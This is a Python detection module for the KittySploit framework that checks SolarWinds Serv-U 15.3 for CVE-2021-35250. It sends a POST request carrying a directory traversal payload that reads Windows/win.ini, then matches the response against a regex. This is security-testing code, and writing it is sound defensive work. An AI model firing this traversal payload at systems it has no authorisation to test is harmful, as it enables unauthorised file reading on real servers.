#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SolarWinds Serv-U 15."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SolarWinds Serv-U 15.3 - Directory Traversal Detection',
        'description': 'SolarWinds Serv-U 15.3 is susceptible to local file inclusion, which may allow an attacker access to installation and server files and also make it possible to obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'solarwinds', 'traversal', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/rissor41/SolarWinds-CVE-2021-35250',
            'https://support.solarwinds.com/SuccessCenter/s/article/Serv-U-15-3-HotFix-1?language=en_US',
            'https://www.solarwinds.com/trust-center/security-advisories/cve-2021-35250',
            'https://twitter.com/shaybt12/status/1646966578695622662?s=43&t=5HOgSFut7Y75N7CBHEikSg',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-35250',
        ],
        'cve': 'CVE-2021-35250',
    }

    def run(self):
        path = '/?Command=NOOP&InternalFile=../../../../../../../../../../../../../../Windows/win.ini&NewWebClient=1'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='/?Command=NOOP\n')
        if not r or r.status_code != 401:
            return False
        body = r.text or ""
        body_regexes = ('\\[(font|extension|file)s\\]',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='SolarWinds Serv-U 15.3 - Directory Traversal detected', path=path)
            return True
        return False

